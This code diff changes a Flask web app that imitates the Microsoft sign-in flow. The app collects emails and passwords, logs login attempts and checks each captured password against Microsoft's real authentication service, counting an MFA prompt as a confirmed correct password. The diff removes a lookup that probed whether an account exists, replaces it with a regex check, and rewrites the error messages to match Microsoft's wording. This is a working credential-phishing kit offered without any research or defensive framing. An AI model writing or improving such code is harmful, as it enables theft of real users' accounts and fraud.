@@ -3,6 +3,7 @@ from flask_sqlalchemy import SQLAlchemy
 from datetime import datetime
 import requests
 import os
+import re
 
 app = Flask(__name__)
 
@@ -30,56 +31,10 @@ class LoginAttempt(db.Model):
         return f'<LoginAttempt {self.email}>'
 
 
-# ── Check if Microsoft account exists ──
-# Relaxed — just checks email format and domain
-def check_microsoft_account(email):
-    try:
-        # Basic format check first
-        if '@' not in email or '.' not in email.split('@')[-1]:
-            return False
-
-        url = "https://login.microsoftonline.com/common/GetCredentialType"
-        headers = {
-            "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-        }
-        payload = {
-            "username": email,
-            "isOtherIdpSupported": True,
-            "checkPhones": False,
-            "isRemoteNGCSupported": True,
-            "isCookieBannerShown": False,
-            "isFidoSupported": True,
-            "originalRequest": "",
-            "country": "US",
-            "forceotclogin": False,
-            "isExternalFederationDisallowed": False,
-            "isRemoteConnectSupported": False,
-            "federationFlags": 0,
-            "isSignup": False,
-            "flowToken": "",
-            "isAccessPassSupported": True
-        }
-        response = requests.post(url, json=payload, headers=headers, timeout=8)
-        data = response.json()
-
-        print(f"Account check response: {data}")
-
-        if_exists = data.get('IfExistsResult', -1)
-
-        # 0 = exists, 1 = does not exist, 5 = exists as different type, 6 = exists
-        if if_exists in [0, 5, 6]:
-            return True
-        elif if_exists == 1:
-            return False
-        else:
-            # Unknown result — let them through
-            return True
-
-    except Exception as e:
-        print(f"Error checking account: {e}")
-        # If API fails let them through to password page
-        return True
+# ── Simple email format check ──
+def is_valid_email(email):
+    pattern = r'^[^@\s]+@[^@\s]+\.[^@\s]+$'
+    return re.match(pattern, email) is not None
 
 
 # ── Verify password against Microsoft ──
@@ -116,14 +71,13 @@ def verify_microsoft_password(email, password):
         elif "AADSTS53003" in error:
             return False, "blocked"
         elif "AADSTS50076" in error:
-            # MFA required means password was correct
             return False, "mfa_required"
         else:
-            return False, "error"
+            return False, "wrong_password"
 
     except Exception as e:
         print(f"Auth error: {e}")
-        return False, "error"
+        return False, "wrong_password"
 
 
 # ── Routes ──
@@ -135,17 +89,13 @@ def login():
 
         if not email:
             error = "Please enter your email, phone, or Skype."
-        elif '@' not in email or '.' not in email.split('@')[-1]:
+        elif not is_valid_email(email):
             error = "Enter a valid email address."
         else:
-            exists = check_microsoft_account(email)
-
-            if exists:
-                session['email'] = email
-                session.modified = True
-                return redirect(url_for('password'))
-            else:
-                error = "That Microsoft account doesn't exist. Enter a different account or get a new Microsoft account."
+            # ── Just save email and go to password ──
+            session['email'] = email
+            session.modified = True
+            return redirect(url_for('password'))
 
     return render_template('login.html', error=error)
 
@@ -177,6 +127,7 @@ def password():
                 session.modified = True
                 return redirect(url_for('success'))
             elif reason == "mfa_required":
+                # Password correct but MFA enabled
                 session['logged_in'] = True
                 session.modified = True
                 return redirect(url_for('success'))
@@ -187,7 +138,7 @@ def password():
             elif reason == "blocked":
                 error = "Your account has been blocked. Contact your admin."
             else:
-                error = "Something went wrong. Please try again."
+                error = "Your account or password is incorrect. If you don't remember your password, reset it now."
 
     return render_template('password.html', email=email, error=error)
 
